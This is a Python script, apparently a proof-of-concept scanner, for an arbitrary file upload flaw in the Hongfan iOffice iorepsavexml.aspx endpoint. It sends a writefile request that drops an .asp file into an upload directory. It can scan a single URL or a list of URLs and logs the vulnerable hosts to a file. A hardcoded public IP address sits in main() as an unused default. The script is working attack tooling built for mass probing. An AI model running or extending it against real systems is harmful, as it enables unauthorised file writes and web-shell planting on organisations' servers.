import requests
import argparse

import warnings
warnings.filterwarnings("ignore")

payload="/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=800031.asp&filepath=/upfiles/rep/pic/"

def print_colored(text, color):
    colors = {
        'black': '\033[0;30m',
        'red': '\033[0;31m',
        'green': '\033[0;32m',
        'yellow': '\033[0;33m',
        'blue': '\033[0;34m',
        'purple': '\033[0;35m',
        'cyan': '\033[0;36m',
        'white': '\033[0;37m'
    }
    reset = '\033[0m'
    if color in colors:
        colored_text = colors[color] + text + reset
        print(colored_text,end='')
    else:
        print(text,end='')
        
        
def send_request(url):
    try:   
        response=requests.get(f"{url}{payload}",timeout=5)
        if response.status_code==200:
            content=response.text
            if "</title></HEAD>" in content:
                print(url,end=' ')
                print_colored('存在红帆iOffice iorepsavexml.aspx接口任意文件上传漏洞 ','green')
                print_colored(f"漏洞路径 {url+payload}",'yellow')
                print()
                res=f"漏洞路径 {url+payload}"
                return res
            else:
                print(url,end=' ')
                print_colored('不存在红帆iOffice iorepsavexml.aspx接口任意文件上传漏洞','red')
                print()
    # requests.exceptions.Timeout
    # requests.exceptions.RequestException as e
    except Exception as e:
        print(f"{url} 请求超时")
        
def main():
    url="http://119.131.119.189:9000"
    parser = argparse.ArgumentParser(description='命令行参数示例')
    # 添加参数选项
    parser.add_argument('-u', '--url', type=str, help='单个url')
    parser.add_argument('-f', '--file', type=str, help='url文本文件路径')
    parser.add_argument('-o', '--output', type=str, help='保存结果')
    # 解析命令行参数
    args = parser.parse_args()
    
    if args.url:
        send_request(args.url)
    if args.file:
        with open(args.file,'r') as f1:
            fs=f1.readlines()
            for u in fs:
                url=u.strip()
                res=send_request(url)
                if args.output:
                    with open(args.output+"/红帆iOffice iorepsavexml接口任意文件上传漏洞.txt",'a+',encoding='utf-8') as f2:
                        if res==None:
                            pass
                        else:
                            f2.write(f"{res}\n")
    
main()